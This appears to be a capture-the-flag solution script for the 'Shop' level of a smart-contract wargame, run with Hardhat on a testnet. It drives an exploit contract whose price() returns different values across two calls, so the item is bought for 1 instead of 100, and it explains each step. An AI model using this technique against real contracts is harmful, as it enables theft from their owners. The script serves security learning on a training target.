import { ethers } from "hardhat";

/**
 * Execute the Shop exploit to buy the item for less than asking price
 * 
 * Usage:
 * SHOP_EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourShopAddress npx hardhat run scripts/level-21-shop/execute-shop-exploit.ts --network sepolia
 */
async function main() {
  console.log("Executing Shop exploit...");
  
  // Get the addresses from environment
  const exploitAddress = process.env.SHOP_EXPLOIT_ADDRESS;
  const targetAddress = process.env.TARGET_ADDRESS;
  
  if (!exploitAddress) {
    throw new Error("Environment variable SHOP_EXPLOIT_ADDRESS must be set");
  }
  
  if (!targetAddress) {
    throw new Error("Environment variable TARGET_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  try {
    // Connect to the contracts
    const shopExploit = await ethers.getContractAt("ShopExploit", exploitAddress);
    const shop = await ethers.getContractAt("Shop", targetAddress);
    
    // Check initial state of the Shop
    const initialPrice = await shop.price();
    const initialIsSold = await shop.isSold();
    console.log(`\nInitial Shop state:`);
    console.log(`  Price: ${initialPrice}`);
    console.log(`  IsSold: ${initialIsSold}`);
    
    if (initialIsSold) {
      console.log("\n‚ö†Ô∏è  Warning: The item is already sold. The exploit has already been executed or someone else bought it.");
      return;
    }
    
    // Test our price function before executing the exploit
    console.log(`\nTesting ShopExploit price() function:`);
    const testPrice = await shopExploit.price();
    console.log(`  Current price() return value: ${testPrice} (should be 100 since item not sold yet)`);
    
    // Execute the exploit
    console.log(`\nExecuting exploit to buy item for less than asking price...`);
    const tx = await shopExploit.exploit();
    console.log("Transaction hash:", tx.hash);
    
    const receipt = await tx.wait();
    console.log("Transaction confirmed in block:", receipt?.blockNumber || 'unknown');
    
    // Check the final state
    const finalPrice = await shop.price();
    const finalIsSold = await shop.isSold();
    console.log(`\nFinal Shop state:`);
    console.log(`  Price: ${finalPrice}`);
    console.log(`  IsSold: ${finalIsSold}`);
    
    // Verify the exploit was successful
    if (finalIsSold && finalPrice < initialPrice) {
      console.log("\n‚úÖ Success! You bought the item for less than the asking price!");
      console.log(`   Original Price: ${initialPrice}`);
      console.log(`   Final Price: ${finalPrice}`);
      console.log(`   Savings: ${initialPrice - finalPrice}`);
      
      console.log("\nüìã How the exploit worked:");
      console.log("   1. Shop.buy() called our price() function the first time");
      console.log("   2. We returned 100 (>= asking price) to pass the check");
      console.log("   3. Shop set isSold = true");
      console.log("   4. Shop.buy() called our price() function the second time");
      console.log("   5. We checked isSold (now true) and returned 1");
      console.log("   6. Shop set price = 1, completing the purchase at a huge discount!");
    } else if (finalIsSold && finalPrice >= initialPrice) {
      console.log("\n‚ö†Ô∏è  The item was sold but the price wasn't reduced. Something went wrong.");
    } else {
      console.log("\n‚ùå Failed! The item was not sold. The exploit didn't work as expected.");
    }
    
    // Test the price function again after the exploit
    console.log(`\nTesting ShopExploit price() function after exploit:`);
    const postPrice = await shopExploit.price();
    console.log(`  Current price() return value: ${postPrice} (should be 1 since item is now sold)`);
    
  } catch (error) {
    console.error("Error executing Shop exploit:", error);
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
